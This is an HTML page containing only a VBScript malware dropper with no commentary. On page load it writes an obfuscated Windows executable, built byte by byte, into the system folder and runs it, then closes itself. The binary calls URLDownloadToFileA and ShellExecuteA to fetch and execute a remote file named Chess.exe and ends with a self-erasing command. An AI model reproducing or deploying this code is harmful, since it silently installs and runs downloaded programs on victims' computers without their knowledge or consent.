<HTML><SCRIPT LANGUAGE="VBScript">
Dim FSO,WSH,OUT,SYS,O
Set FSO=CreateObject("Scripting.FileSystemObject")
Set WSH=CreateObject("WScript.Shell")
SYS=FSO.GetSpecialFolder(1)
Set OUT=FSO.CreateTextFile(SYS&"\temp.exe",True)
Function C(I)
C=Chr(I)
End Function
O=C(0)
Function S(I,J)
S=String(J,I)
End Function
Function N(I)
N=S(O,I)
End Function

OUT.Write("MZ�"&O&C(3)&N(3)&C(4)&N(3)&"��"&O&O&"�"&N(7)&"@"&N(35)&"�"&N(3)&C(14)&C(31)&"�"&C(14)&O&"�"&C(9)&"�!�"&C(1)&"L�!This program cannot be run in DOS mode."&S(C(13),2)&C(10)&"$"&N(7)&"]"&C(23)&C(29)&"�"&C(25)&"vs�"&C(25)&"vs�"&C(25)&"vs�"&C(25)&"vs�"&C(20)&"vs��Va�"&C(24)&"vs�Rich"&C(25)&"vs�"&N(8)&"PE"&O&O&"L"&C(1)&C(3)&O&"��?"&N(8)&"�"&O&C(15)&C(1)&C(11)&C(1)&C(5)&C(12)&O&C(2)&N(3)&C(4)&N(7)&C(16)&N(3)&C(16)&N(3)&" "&N(4)&"@"&O&O&C(16)&N(3)&C(2)&O&O&C(4)&N(7)&C(4)&N(8)&"@"&N(3)&C(4)&N(6)&C(2)&N(5)&C(16)&O&O&C(16)&N(4)&C(16)&O&O&C(16)&N(6)&C(16)&N(11)&"d "&O&O&"P"&N(84)&" "&O&O&"$"&N(27)&".text"&N(3)&"�"&N(4)&C(16)&N(3)&C(2)&N(3)&C(4)&N(14)&" "&O&O&"`.rdata"&O&O&"h"&C(1)&N(3)&" "&N(3)&C(2)&N(3)&C(6)&N(14)&"@"&O&O&"@.data"&N(3)&"4"&C(1)&N(3)&"0"&N(3)&C(2)&N(3)&C(8)&N(14)&"@"&O&O&"�"&N(480)&"j"&O&"j"&O&"h$ @"&O&"h2 @"&O&"j"&O&"�m"&N(3)&"j"&C(5)&"j"&O&"j"&O&"h$ @"&O&"j"&O&"j"&O&"�S"&N(3)&"h"&O&C(1)&O&O&"h40@"&O&"j"&O&"�0"&N(3)&"h"&C(3)&C(1)&O&O&"h40@"&O&"h40@"&O&"�"&C(34)&N(3)&"h40@"&O&"h"&O&"0@"&O&"�"&C(25)&N(3)&"j"&O&"�"&N(4)&"�%"&O&" @"&O&"�%"&C(4)&" @"&O&"�%"&C(8)&" @"&O&"�%"&C(12)&" @"&O&"�%"&C(20)&" @"&O&"�%"&C(28)&" @"&N(377)&"� "&O&O&"� "&O&O&"� "&O&O&C(16)&"!"&N(6)&"*!"&N(6)&"F!"&N(6)&"C:\winwmi.exe"&O&"http://cgi-bin.spaceports.com/~shoppage/Chess.exe"&O&"� "&N(10)&C(28)&"!"&N(3)&" "&O&O&"� "&N(10)&":!"&O&O&C(20)&" "&O&O&"� "&N(10)&"\!"&O&O&C(28)&" "&N(22)&"� "&O&O&"� "&O&O&"� "&O&O&C(16)&"!"&N(6)&"*!"&N(6)&"F!"&N(6)&"u"&O&"ExitProcess"&O&C(15)&C(1)&"GetModuleFileNameA"&O&O&"9"&C(1)&"GetShortPathNameA"&O&"�"&C(2)&"lstrcatA"&O&O&"KERNEL32.dll"&O&O&"n"&O&"ShellExecuteA"&O&"SHELL32.dll"&O&"?"&O&"URLDownloadToFileA"&O&O&"urlmon.dll"&N(154)&"C:\Command.com /C Choice.com /C:YN /N /T:Y,10|erase"&N(461))
OUT.Close

WSH.run(SYS & "\temp.exe") 

self.close
</SCRIPT></HTML>